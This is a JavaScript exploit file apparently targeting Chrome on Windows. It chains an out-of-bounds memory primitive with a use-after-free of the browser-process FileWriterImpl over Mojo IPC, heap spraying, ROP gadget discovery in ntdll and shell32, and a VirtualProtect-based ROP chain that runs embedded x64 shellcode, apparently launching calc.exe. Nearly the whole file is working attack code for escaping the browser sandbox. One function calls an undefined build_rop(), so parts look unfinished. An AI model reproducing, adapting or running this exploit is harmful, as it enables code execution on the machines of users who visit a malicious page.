// offset of the global mojo::Core object in chrome_child.dll
const kChromeChildCoreOffset  = 0x5318168n;

const kFileWriterImplSize = 0x140;

// target address for our heap/vm-spray, and the fake objects it will contain
// can be any address that are multiples of 0x1000n (cannot be too small)
const kSprayPtr = 0x40404040000n;

const kStackSize = 0x200;
const kShellcodeSize = 0x800;
const kShellcodePageSize = 0x1000;

const kPtrToStartOfShellCodeBaseAddressOffset = 0xa00;
const kPtrToStartOfShellCode = kSprayPtr + BigInt(kPtrToStartOfShellCodeBaseAddressOffset);

// libraries that we need to find in renderer address space
var chrome_child = null;
var kernel32 = null;
var ntdll = null;
var shell32 = null;

// pointers that we need for our pivot/rop chain
var virtual_alloc_ptr = 0n;
var virtual_protect_ptr = 0n;
var memcpy_ptr = 0n;
var shellexecutew_ptr = 0n;

var pivot_gadget_ptr = 0n;
var pop_gadget_ptr = 0n;
var ret_gadget_ptr = 0n;
var mov_rcx_rax_gadget_ptr = 0n;
var jmp_rcx_gadget_ptr = 0n;
var shell32_mov_rcx_rax_gadget_ptr = 0n;
var shell32_mov_rax_rcx_gadget_ptr = 0n;
var pop_rcx_ret_gadget = 0n;
var pop_rdx_ret_gadget = 0n;
var pop_r8_ret_gadget = 0n;
var pop_r9_r10_r11_ret_gadget = 0n;

// pointers that we need to patch into our payload
var winexec_ptr = 0n;

// mojo interfaces to the browser process
var blob_registry_ptr = null;
var file_system_manager_ptr = null;

function bind_interfaces() {
  print('[1] bind_interfaces');
  blob_registry_ptr = new blink.mojom.BlobRegistryPtr();
  Mojo.bindInterface(blink.mojom.BlobRegistry.name,
                     mojo.makeRequest(blob_registry_ptr).handle, "process");
  print('  [*] blink::mojom::BlobRegistry');

  file_system_manager_ptr = new blink.mojom.FileSystemManagerPtr();
  Mojo.bindInterface(blink.mojom.FileSystemManager.name,
                     mojo.makeRequest(file_system_manager_ptr).handle, "process");
  print('  [*] blink::mojom::FileSystemManager');
}

function find_libraries(oob) {
  print('[2] find_libraries');

  let window_ptr = oob.objToPtr(window);
  let chrome_child_ptr = oob.getUint64(window_ptr + 0x20n);

  chrome_child = new pe64(oob, chrome_child_ptr);
  print('  [*] chrome_child:              0x' + chrome_child.base.toString(16));

  virtual_alloc_ptr = chrome_child.getImport('KERNEL32.dll', 'VirtualAlloc');
  print('    [-] kernel32!VirtualAlloc:   0x' + virtual_alloc_ptr.toString(16));

  kernel32 = new pe64(oob, virtual_alloc_ptr);
  print('  [*] kernel32:                  0x' + kernel32.base.toString(16));

  virtual_protect_ptr = kernel32.getExport('VirtualProtect');
  print('    [-] kernel32!VirtualProtect: 0x' + virtual_protect_ptr.toString(16));

  winexec_ptr = kernel32.getExport('WinExec');
  print('    [-] kernel32!WinExec:        0x' + winexec_ptr.toString(16));

  memcpy_ptr = kernel32.getImport('ntdll.dll', 'memcpy');
  print('    [-] ntdll!memcpy:            0x' + memcpy_ptr.toString(16));

  ntdll = new pe64(oob, memcpy_ptr);
  print('  [*] ntdll:                     0x' + ntdll.base.toString(16));

  pivot_gadget_ptr = ntdll.getGadget([
      0x48, 0x8b, 0x51, 0x50, // mov rbx, qword ptr [rcx+50h]
      0x48, 0x8b, 0x69, 0x18, // mov rbp, qword ptr [rcx+18h]
      0x48, 0x8b, 0x61, 0x10, // mov rsp, qword ptr [rcx+10h]
      0xff, 0xe2              // jmp rdx
    ]);
  print('    [-] pivot_gadget:            0x' + pivot_gadget_ptr.toString(16));

  pop_gadget_ptr = ntdll.getGadget([
      0x5a,                   // pop rdx
      0x59,                   // pop rcx
      0x41, 0x58,             // pop r8
      0x41, 0x59,             // pop r9
      0x41, 0x5a,             // pop r10
      0x41, 0x5b,             // pop r11
      0xc3                    // ret
    ]);
  ret_gadget_ptr = pop_gadget_ptr + 10n;
  print('    [-] pop_gadget:              0x' + pop_gadget_ptr.toString(16));

  mov_rcx_rax_gadget_ptr = ntdll.getGadget([
      0x48, 0x8b, 0xc8,       // mov rcx, rax
      0x48, 0x8b, 0xc1,       // mov rax, rcx
      0x48, 0x83, 0xc4, 0x28, // add rsp, 28h
      0xc3                    // ret
    ])
  print('    [-] mov_rcx_rax_gadget:      0x' + mov_rcx_rax_gadget_ptr.toString(16));

  jmp_rcx_gadget_ptr = ntdll.getGadget([
      0xff, 0xe1              // jmp rcx
    ])
  print('    [-] jmp_rcx_gadget:          0x' + jmp_rcx_gadget_ptr.toString(16));

  // newer versions of ntdll do not have the mov_rcx_rax_gadget_ptr gadget
  if (mov_rcx_rax_gadget_ptr == 0n) {
    print('  [*] chrome_child:');

    shellexecutew_ptr = chrome_child.getImport('SHELL32.dll', 'ShellExecuteW');
    print('    [-] shell32!ShellExecuteW:   0x' + shellexecutew_ptr.toString(16));

    shell32 = new pe64(oob, shellexecutew_ptr);
    print('  [*] shell32:                  0x' + shell32.base.toString(16));

    shell32_mov_rcx_rax_gadget_ptr = shell32.getGadget([
      0x48, 0x8B, 0xC8,       // mov rcx, rax
      0x48, 0x85, 0xC9,       // test rcx, rcx
      0x0F, 0x95, 0xC0,       // setne al
      0xC3                    // ret
    ]);
    print('    [-] shell32_mov_rcx_rax_gadget:            0x' + shell32_mov_rcx_rax_gadget_ptr.toString(16));

    shell32_mov_rax_rcx_gadget_ptr = shell32.getGadget([
      0x48, 0x8B, 0xC1,       // mov rax, rcx
      0x48, 0x83, 0xC4, 0x28, // add rsp, 0x28
      0xC3                    // ret
    ]);
    print('    [-] shell32_mov_rax_rcx_gadget:            0x' + shell32_mov_rax_rcx_gadget_ptr.toString(16));
  }

  pop_rcx_ret_gadget = ntdll.base + 0x90cf9n // 0x180090cf9: pop rcx ; ret  ;  (1 found)
  pop_rdx_ret_gadget = ntdll.base + 0x6066dn // 0x18006066d: pop rdx ; ret  ;  (1 found)
  pop_r8_ret_gadget = ntdll.base + 0x69d3n   // 0x1800069d3: pop r8 ; ret  ;  (1 found) 
  pop_r9_r10_r11_ret_gadget = ntdll.base + 0x8b6e4n  // 0x18008b6e4: pop r9 ; pop r10 ; pop r11 ; ret  ;  (1 found)
}

// 204: 0xcc
// 144: 0x90
function build_my_shellcode() {
  let ab = new ArrayBuffer(0x512);
  let u8ab = new Uint8Array(ab);
  u8ab.set(new Uint8Array(
    [   0xCC,
        0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
        0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52,
        0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
        0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED,
        0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88,
        0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
        0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48,
        0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1,
        0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
        0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49,
        0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A,
        0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
        0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B,
        0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
        0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47,
        0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x2E,
        0x65, 0x78, 0x65, 0x00
    ]));
  let shellcode = new DataView(ab);
  return shellcode;
}

function build_rop_stack_for_some_reason_cannot_just_vp_the_heap() {
  let stack = new DataView(new ArrayBuffer(kStackSize));
  let i = 0;

  function push(value) {
    stack.setBigUint64(i, value, true);
    i += 8;
  }

  push(pop_rcx_ret_gadget);
  push(kPtrToStartOfShellCode);
  push(pop_rdx_ret_gadget);
  push(0x1000n);
  push(pop_r8_ret_gadget);
  push(0x20n);
  push(pop_r9_r10_r11_ret_gadget);
  push(kSprayPtr);
  push(0x41n);
  push(0x41n);
  push(virtual_protect_ptr);
  push(kPtrToStartOfShellCode);
  return stack;
}

function build_rop_stack() {
  let stack = new DataView(new ArrayBuffer(kStackSize));
  let i = 0;

  function push(value) {
    stack.setBigUint64(i, value, true);
    i += 8;
  }

  function call(fn_ptr, arg0=0x2323232323232323n, arg1=0x2323232323232323n, 
      arg2=0x2323232323232323n, arg3=0x2323232323232323n) {
    push(pop_gadget_ptr);

    push(arg1); // rdx
    push(arg0); // rcx
    push(arg2); // r8
    push(arg3); // r9
    push(0x2323232323232323n);
    push(0x2323232323232323n);
    push(fn_ptr);

    // leave scratch space
    push(pop_gadget_ptr);
    push(0x2323232323232323n);
    push(0x2323232323232323n);
    push(0x2323232323232323n);
    push(0x2323232323232323n);
    push(0x2323232323232323n);
    push(0x2323232323232323n);
  }

  function chained_call(fn_ptr, arg1=0x2323232323232323n, 
      arg2=0x2323232323232323n, arg3=0x2323232323232323n) {
    // first load arg1, arg2, arg3 into rdx, r8, r9 preserving rax, then move
    // rax into rcx and call the function
    push(pop_gadget_ptr);

    push(arg1); // rdx
    push(0x2323232323232323n);
    push(arg2); // r8
    push(arg3); // r9
    push(0x2323232323232323n);
    push(0x2323232323232323n);
    if (mov_rcx_rax_gadget_ptr != 0n) {
      push(mov_rcx_rax_gadget_ptr);
    }
    else {
      push(shell32_mov_rcx_rax_gadget_ptr);
      push(shell32_mov_rax_rcx_gadget_ptr);
    }

    push(0x2323232323232323n);
    push(0x2323232323232323n);
    push(0x2323232323232323n);
    push(0x2323232323232323n);
    push(0x2323232323232323n);
    push(fn_ptr);

    // leave scratch space
    push(pop_gadget_ptr);
    push(0x2323232323232323n);
    push(0x2323232323232323n);
    push(0x2323232323232323n);
    push(0x2323232323232323n);
    push(0x2323232323232323n);
    push(0x2323232323232323n); 
  }

  call(
    virtual_alloc_ptr, 0n, 0x1000n, 0x3000n, 0x4n);
  chained_call(
    memcpy_ptr, kPtrToStartOfShellCode, BigInt(kShellcodeSize));
  chained_call(
    virtual_protect_ptr, BigInt(kShellcodeSize), 0x20n, kPtrToStartOfShellCode);
  push(
    jmp_rcx_gadget_ptr);

  return stack;
}

async function build_page() {
  print('[3] build_page');

  let size = kShellcodePageSize

  let page = new DataView(new ArrayBuffer(size));
  let stack = build_rop();
  let shellcode = build_my_shellcode();

  const kFileSystemOperationRunnerPtrBaseAddressOffset = 0x000;
  const kFileSystemOperationRunnerPtr = kSprayPtr + BigInt(kFileSystemOperationRunnerPtrBaseAddressOffset);

  const kFileSystemContextPtrBaseAddressOffset = 0x020;
  const kFileSystemContextPtr = kSprayPtr + BigInt(kFileSystemContextPtrBaseAddressOffset);

  const kFileSystemBackendNodePtrBaseAddressOffset = 0x0a0;
  const kFileSystemBackendNodePtr = kSprayPtr + BigInt(kFileSystemBackendNodePtrBaseAddressOffset);

  const kSomeValuePtrBaseAddressOffset = 0x100;
  const kSomeValuePtr = kSprayPtr + BigInt(kSomeValuePtrBaseAddressOffset);

  const kSomeValueAgainPtrBaseAddressOffset = 0x120;
  const kSomeValueAgainPtr = kSprayPtr + BigInt(kSomeValueAgainPtrBaseAddressOffset);

  const kThisShouldPointToHeapPtrWhichPointsToStartOfRopBaseAddressOffset = 0x200;
  const kThisShouldPointToHeapPtrWhichPointsToStartOfRop = kSprayPtr + BigInt(kThisShouldPointToHeapPtrWhichPointsToStartOfRopBaseAddressOffset);

  const kSomeValueAgainAgainPtrBaseAddressOffset = 0x2a0;
  const kSomeValueAgainAgainPtr = kSprayPtr + BigInt(kSomeValueAgainAgainPtrBaseAddressOffset);

  const kHeapPtrToStartOfRopBaseAddressOffset = 0x300;
  const kHeapPtrToStartOfRop = kSprayPtr + BigInt(kHeapPtrToStartOfRopBaseAddressOffset);

  // kFileSystemOperationRunnerPtr
  page.setBigUint64(kFileSystemOperationRunnerPtrBaseAddressOffset + 0x0, 0xdeadbeefn, true); // kFileSystemOperationRunnerPtr
  page.setBigUint64(kFileSystemOperationRunnerPtrBaseAddressOffset + 0x8, kFileSystemContextPtr, true); // should point to kFileSystemContextPtr

  // kFileSystemContextPtr
  page.setBigUint64(kFileSystemContextPtrBaseAddressOffset + 0x78, kFileSystemBackendNodePtr, true); // kFileSystemBackendNodePtr

  // kFileSystemBackendNodePtr
  page.setBigUint64(kFileSystemBackendNodePtrBaseAddressOffset + 0x8, kSomeValuePtr, true); // kSomeValuePtr, needs to be bigger than 
  page.setBigUint64(kFileSystemBackendNodePtrBaseAddressOffset + 0x20, 0x0n, true);
  page.setBigUint64(kFileSystemBackendNodePtrBaseAddressOffset + 0x28, kThisShouldPointToHeapPtrWhichPointsToStartOfRop, true); // kFileSystemBackendPtr

  // kSomeValuePtr
  page.setBigUint64(kSomeValuePtrBaseAddressOffset + 0x0, kSomeValueAgainPtr, true); // kSomeValueAgainPtr
  page.setBigUint64(kSomeValuePtrBaseAddressOffset + 0x19, 0x0n, true);
  page.setBigUint64(kSomeValuePtrBaseAddressOffset + 0x28, kThisShouldPointToHeapPtrWhichPointsToStartOfRop, true); // kFileSystemBackendPtr

  // kSomeValueAgainPtr
  page.setBigUint64(kSomeValueAgainPtrBaseAddressOffset + 0x19, 0x1n, true);

  // kFileSystemBackendPtr / kThisShouldPointToHeapPtrWhichPointsToStartOfRop
  page.setBigUint64(kThisShouldPointToHeapPtrWhichPointsToStartOfRopBaseAddressOffset + 0x0, kSomeValueAgainAgainPtr, true); // kSomeValueAgainAgainPtr
  page.setBigUint64(kThisShouldPointToHeapPtrWhichPointsToStartOfRopBaseAddressOffset + 0x10, kHeapPtrToStartOfRop, true); // kHeapPtrToStartOfRop
  page.setBigUint64(kThisShouldPointToHeapPtrWhichPointsToStartOfRopBaseAddressOffset + 0x50, ret_gadget_ptr, true); // rdx

  // kSomeValueAgainAgainPtr
  page.setBigUint64(kSomeValueAgainAgainPtrBaseAddressOffset + 0x38, pivot_gadget_ptr, true); // will jmp rdx at the end, so rdx should be a ret

  // kHeapPtrToStartOfRop
  for (var i = 0; i < stack.byteLength; ++i) {
    page.setUint8(kHeapPtrToStartOfRopBaseAddressOffset + i, stack.getUint8(i));
  }

  // kPtrToStartOfShellCode
  for (var i = 0; i < shellcode.byteLength; ++i) {
    page.setUint8(kPtrToStartOfShellCodeBaseAddressOffset + i, shellcode.getUint8(i));
  }


  return page;
}

function build_file_writer_impl() {
  print('[4] build_file_writer_impl');

  var file_writer_impl = new DataView(new ArrayBuffer(0x140));
  file_writer_impl.setBigUint64(0x0, 0xcafebaben, true);
  file_writer_impl.setBigUint64(0x08, kSprayPtr, true);
  file_writer_impl.setUint8(0x20, 1) // url.is_valid_ (i think it can be anything bigger than 0x0)
  //file_writer_impl.setUint8(0xd0, 0) // must be 0, this will be used in GetFileSystemBackend and stored as edx/rdx

  return file_writer_impl;
}

function spray(oob, page_data) {
  print('[5] spray');

  const kPageSize     = kShellcodePageSize;
  const kHugePageSize = 0x40000000;

  function get_mojo_handle(oob, object) {
    let object_ptr = oob.objToPtr(object);
    let object_handle_ptr = oob.getUint64(object_ptr + 0x20n);
    let object_handle = oob.getUint32(object_handle_ptr + 0x10n);
    return object_handle;
  }

  let shared_memory = Mojo.createSharedBuffer(kHugePageSize).handle;
  let shared_memory_handle = get_mojo_handle(oob, shared_memory);

  print('  [*] initializing shared memory');
  var page_view = new DataView(page_data);
  for (var i = 0; i < kHugePageSize / kPageSize; i += 1) {
    let shared_buffer = shared_memory.mapBuffer(i * kPageSize, kPageSize);
    let shared_view = new DataView(shared_buffer.buffer);
    for (var j = 0; j < kPageSize; j += 4) {
      shared_view.setUint32(j, page_view.getUint32(j));
    }
  }

  print('  [*] creating pipes and dupes');
  let pipes = [];
  let dupes = [];
  let pipe_handles = new Set([]);
  let dupe_handles = new Set([]);
  for (var i = 0; i < 2*0xc88; ++i) {
    let pipe = Mojo.createDataPipe({elementNumBytes: 0x1, capacityNumBytes: kShellcodePageSize});
    let dupe = shared_memory.duplicateBufferHandle();
    let pipe_handle = get_mojo_handle(oob, pipe.consumer);
    let dupe_handle = get_mojo_handle(oob, dupe.handle);

    pipes.push(pipe);
    dupes.push(dupe);
    pipe_handles.add(pipe_handle);
    dupe_handles.add(dupe_handle);
  }

  let mojo_core_ptr = oob.getUint64(chrome_child.base + kChromeChildCoreOffset);
  // this is the member handles_ of the mojo::Core object.
  let mojo_handles_ptr = oob.getUint64(mojo_core_ptr + 0x20n);

  let pipe_dispatchers = [];
  let dupe_dispatchers = [];

  var list_node_ptr = oob.getUint64(mojo_handles_ptr + 0x10n);
  let list_length = oob.getUint64(mojo_handles_ptr + 0x18n);
  for (var i = 0; i <= list_length; ++i) {
    let list_node_handle = oob.getUint32(list_node_ptr + 0x10n);
    let list_node_dispatcher = oob.getUint64(list_node_ptr + 0x18n);
    if (pipe_handles.has(list_node_handle)) {
      pipe_dispatchers.push(list_node_dispatcher);
    } else if (dupe_handles.has(list_node_handle)) {
      dupe_dispatchers.push(list_node_dispatcher);
    }
    list_node_ptr = oob.getUint64(list_node_ptr);
  }

  for (var i = 0; i < pipe_dispatchers.length && i < dupe_dispatchers.length; ++i) {
    oob.memswap(pipe_dispatchers[i] + 0x80n,
                dupe_dispatchers[i] + 0x20n,
                0x28n);

    oob.setUint32(pipe_dispatchers[i] + 0x18n, 0x40000000);
    oob.setUint32(pipe_dispatchers[i] + 0x1cn, 0x40000000);
  }

  print('  [*] spraying');
  let by_right = pipes.length
  let by__left = 3000
  let bypass = by__left

  let ab = new ArrayBuffer(1);
  for (var i = 0; i < bypass; ++i) {
    blob_registry_ptr.registerFromStream("", "", 0x1, pipes[i].consumer, null);
    pipes[i].producer.writeData(ab);
  }

  return () => {
    print('[7] freeing spray')
    let ab = new ArrayBuffer(0xfff);
    for (var i = 0; i < bypass; ++i) {
      pipes[i].producer.writeData(ab);
    }

    print('[7] freeing spray2')

    for (var i = 0; i < bypass; ++i) {
      pipes[i].producer.close();
    }


    for (var i = 0; i < dupes.length; ++i) {
      dupes[i].handle.close();
    }
    print('[7] done');
  };
}

async function register_blob_0() {
  print('[6] register_blob_0');

  function BytesProviderImpl() {
    this.binding = new mojo.Binding(blink.mojom.BytesProvider, this);
  }

  let bytes_provider = new BytesProviderImpl();
  let bytes_provider_ptr = new blink.mojom.BytesProviderPtr();
  bytes_provider.binding.bind(mojo.makeRequest(bytes_provider_ptr));

  let blob_ptr = new blink.mojom.BlobPtr();
  let blob_req = mojo.makeRequest(blob_ptr);

  let data_element = new blink.mojom.DataElement();
  data_element.bytes = new blink.mojom.DataElementBytes();
  data_element.bytes.length = 1;
  data_element.bytes.embeddedData = [0];
  data_element.bytes.data = bytes_provider_ptr;

  await blob_registry_ptr.register(blob_req, 'blob_0', "text/html", "", [data_element]);

  return blob_ptr;
}

function Allocation(size=280) {
  function ProgressClient() {
    function ProgressClientImpl() {
    }

    ProgressClientImpl.prototype = {
      onProgress: async (arg0) => {
      }
    };

    var progress_client_ptr = new mojo.AssociatedInterfacePtrInfo();
    var progress_client_req = mojo.makeRequest(progress_client_ptr);
    var progress_client_binding = new mojo.AssociatedBinding(
      blink.mojom.ProgressClient, new ProgressClientImpl(), progress_client_req);

    return progress_client_ptr;
  }

  this.pipe = Mojo.createDataPipe({elementNumBytes: size, capacityNumBytes: size});
  this.serialized_blob = blob_registry_ptr.registerFromStream("", "", size, this.pipe.consumer, ProgressClient());

  this.malloc = function(data) {
    this.pipe.producer.writeData(data);
  }

  this.free = function() {
    this.pipe.producer.close();
  }

  return this;
}

async function file_writer(oob) {
  //%DebugPrint([]);
  alert('[file_writer]');

  const kAllocationCount = 0x100; // 0x8000

  bind_interfaces();
  find_libraries(oob);
  let page = await build_page();
  let file_writer_impl = build_file_writer_impl();

  let heap = new Array(kAllocationCount);
  for (var i = 0; i < kAllocationCount; ++i) {
    heap[i] = new Allocation(kFileWriterImplSize);
  }

  let host_url = new url.mojom.Url();
  host_url.url = window.location.href;

  let open_result = await file_system_manager_ptr.open(host_url, 0);

  let file_url = new url.mojom.Url();
  file_url.url = open_result.rootUrl.url + '/aaaa';

  var create_writer_result = await file_system_manager_ptr.createWriter(file_url);

  function Blob0Impl() {
    this.binding = new mojo.Binding(blink.mojom.Blob, this);
  }

  Blob0Impl.prototype = {
    getInternalUUID: async (arg0) => {
      print('  [!] freeing FileWriterImpl');
      create_writer_result.writer.ptr.reset();

      for (var i = 0; i < kAllocationCount; ++i) {
        heap[i].malloc(file_writer_impl.buffer);
      }

      cleanup = spray(oob, page.buffer);
      oob.cleanup();
      register_blob_0();

      cleanup();

      return {'uuid': 'blob_0'};
    }
  };

  let blob_impl = new Blob0Impl();
  let blob_impl_ptr = new blink.mojom.BlobPtr();
  blob_impl.binding.bind(mojo.makeRequest(blob_impl_ptr));
  create_writer_result.writer.write(0, blob_impl_ptr);

  setTimeout(function(){
    for (var i = 0; i < kAllocationCount; ++i) {
      heap[i].free();
    }
  }, 5000);
}
